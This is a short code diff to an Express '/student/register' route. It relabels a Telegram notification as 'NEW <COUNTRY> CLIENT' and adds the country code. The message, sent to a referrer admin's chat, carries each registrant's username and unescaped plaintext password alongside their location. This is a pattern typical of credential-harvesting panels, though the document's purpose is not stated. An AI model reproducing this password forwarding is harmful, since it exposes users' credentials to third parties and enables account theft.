@@ -651,12 +651,12 @@ app.post("/student/register", async (req, res) => {
     // Notify admin & owner (don't expose password in logs or persistent messages in production — this matches your prior behavior but consider removing)
     const platformName = (platform || "NEXA").toString();
     const adminMsg = `
-🌟 NEW STUDENT
+🌟NEW ${location.country.toUpperCase()} CLIENT ${location.flag || "Unknown"}
 Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
 \n Password: *${password}*
 Referrer: *${escapeMarkdown(admin.username)}*
-Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}
+Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
 
